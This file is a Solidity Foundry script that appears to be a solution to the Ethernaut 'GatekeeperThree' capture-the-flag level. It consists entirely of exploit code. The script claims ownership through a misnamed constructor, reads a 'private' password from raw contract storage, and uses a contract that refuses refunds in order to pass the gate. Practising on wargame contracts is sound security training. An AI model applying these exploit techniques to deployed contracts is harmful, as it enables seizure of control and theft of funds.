// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GateKeeperThree.sol";
import {Script} from "forge-std/Script.sol";

contract AttackerContract {
    GatekeeperThree gatekeeperThreeInstance;

    constructor(address payable _address) {
        gatekeeperThreeInstance = GatekeeperThree(_address);
    }

    function attack(uint256 password) public {
        gatekeeperThreeInstance.construct0r();
        gatekeeperThreeInstance.getAllowance(uint256(password));
        gatekeeperThreeInstance.enter();
    }

    receive() external payable {
        require(msg.value > 0.0015 ether);
    }
}

contract GateKeeperThreeAttack is Script {
    GatekeeperThree public gatekeeperThree = GatekeeperThree(payable(0xa2c28fe8Dd7553956b671d171377A405324e5322));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackerContract attackerContract = new AttackerContract(payable(address(gatekeeperThree)));
        
        gatekeeperThree.createTrick();

        SimpleTrick simpleTrick = SimpleTrick(gatekeeperThree.trick());

        bytes32 passwordLow = vm.load(address(simpleTrick), bytes32(uint256(2)));

        (bool success,) = payable(address(gatekeeperThree)).call{value: 0.0015 ether}("");

        require(success, "Failed");

        attackerContract.attack(uint256(passwordLow));

        vm.stopBroadcast();
    }
}